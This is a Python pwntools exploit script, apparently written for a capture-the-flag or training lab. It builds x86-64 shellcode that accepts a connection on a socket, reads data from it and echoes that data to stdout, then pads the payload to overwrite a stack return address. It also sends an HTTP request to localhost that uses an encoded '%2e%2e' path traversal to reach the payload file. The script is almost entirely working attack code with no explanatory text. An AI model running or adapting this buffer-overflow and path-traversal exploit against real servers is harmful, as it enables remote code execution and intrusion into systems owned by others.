from pwn import *
import requests
context.arch = "amd64"
# shellcode = asm(shellcraft.write(1, 0x7fffffffc2d0, 0x1ff))
# shellcode = asm(shellcraft.accept(3, 0x00007fffffffbe90, 0x00007fffffffbea8))
# 0x00007fffffffbf98
# 0x00007fffffffbfa0
# 0x00007fffffffbea0
shellcode_asm="""
    sub rsp, 0x100
    push 0x10
    /* accept(fd=3, addr=0x7fffffffbe90, addr_len=0x7fffffffbea8) */
    push 3
    pop rdi
    mov rdx, 0x101010101010101 /* 140737488338600 == 0x7fffffffbea8 */
    push rdx
    mov rdx, 0x1017efefefebfa9
    xor [rsp], rdx
    pop rdx
    mov rsi, 0x101010101010101 /* 140737488338576 == 0x7fffffffbe90 */
    push rsi
    mov rsi, 0x1017efefefebf91
    xor [rsp], rsi
    pop rsi
    /* call accept() */
    push SYS_accept /* 0x2b */
    pop rax
    syscall

    /* call read('rax', 0x7fffffffbfa0, 0x3e8) */
    mov rdi, rax
    xor eax, eax /* SYS_read */
    xor edx, edx
    mov dx, 0x3e8
    mov rsi, 0x101010101010101 /* 140737488338848 == 0x7fffffffbfa0 */
    push rsi
    mov rsi, 0x1017efefefebea1
    xor [rsp], rsi
    pop rsi
    syscall

        /* write(fd=1, buf=0x7fffffffbfa0, n=0x3e8) */
    push 1
    pop rdi
    xor edx, edx
    mov dx, 0x3e8
    mov rsi, 0x101010101010101 /* 140737488338848 == 0x7fffffffbfa0 */
    push rsi
    mov rsi, 0x1017efefefebea1
    xor [rsp], rsi
    pop rsi
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
"""

shellcode = asm(shellcode_asm)

shellcode += b"A"*(0x1f99 - len(shellcode)) + 0x00007fffffff9fff.to_bytes(8, "little")

with open("test.txt", "wb+") as fd:
    fd.write(shellcode)


url = "http://localhost:80/%2e%2e/%2e%2e/%2e%2e/home/hacker/test.txt"
response = requests.get(url)
print(response.text)